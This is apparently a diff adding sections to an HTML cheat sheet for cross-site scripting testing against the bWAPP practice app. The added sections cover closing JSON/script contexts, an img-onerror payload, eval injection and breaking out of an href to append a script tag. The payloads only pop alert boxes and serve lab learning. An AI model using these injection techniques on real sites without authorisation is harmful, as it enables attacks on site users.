@@ -51,6 +51,17 @@ like the following:<b>&amp;&num;0000000040</b>
 <b>DESCRIPTION:</b> It is when data is retrieved in the webpage without any restriction. So it can be used to exfiltrate information, 
 stole information, etc.
 
+<b>NOTE:</b> 
+	
+-It is important to analyze if exist some code behind performing actions, check if you can analyze the syntax/format to close the query. 
+The following sample is closing two sections of the query,  "}]}'; and &lt;/script&gt;
+-Try to add a new header, that will reflect if allows custom headers or not. | bWAPP: &lt;script&gt;alert(1)&lt;/script&gt;
+
+<b>SAMPLE:</b>
+
+&lt;/script&gt;
+        var JSONResponseString = '{"movies":[{"response":"test??? Sorry, we don&#039;t have that movie :("}]}';
+
 <b>GENERAL TECHNIQUES</b>
 
 <b>COMMON TESTS: </b>	
@@ -85,6 +96,40 @@ parameters some payloads can be used to escape.
 <b>C1: </b><mark id="FGT01">'-alert(1)-'</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#FGT01')">.C1.</button>
+
+<b>::: INTO AJAX/XML</b>
+
+<b>C1: </b><mark id="IAM01">&lt;img src=&apos;#&apos; onerror=&apos;alert(1)&apos;&gt;</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#IAM01')">.C1.</button>
+
+<b>::: EVAL FUNCTION</b>
+
+<b>SAMPLE:</b> http://192.168.37.129/bWAPP/xss_eval.php?date=Date()
+
+Here it will depends but is only needed to add a script tag into the Date() function. If security if broken, it will pop-up
+an alert. 
+
+<b>::: HREF</b>
+
+Here it will depends based on where the HREF is located, however, it is really important to analyze the syntax/format of the
+query, check if exist some way to close the query to append the XSS command. Check sample,
+
+<b>SAMPLE:</b>
+
+&lt;td align="center"&gt; &lt;a href=xss_href-3.php?movie=1&name=TEST&action=vote&gt;Vote&lt;/a&gt;&lt;/td&gt;
+	
+<b>ATTACK:</b> http://192.168.37.129/bWAPP/xss_href-2.php?name=TEST><script>alert('XSS')</script>&action=vote 
+
+If you check, the HREF is part of a column in a table as it is using the td HTML tag, you can confirm checking where is located 
+the word TEST. So, here you can close the <b>a href</b> tag and append the <b>script tag</b>. This will do a XSS attempt, as the 
+script HTML tag is added.  
+
+
+	
+
+
+
 	
 <details>
 <summary>TEST VIA DEV TOOLS</summary>
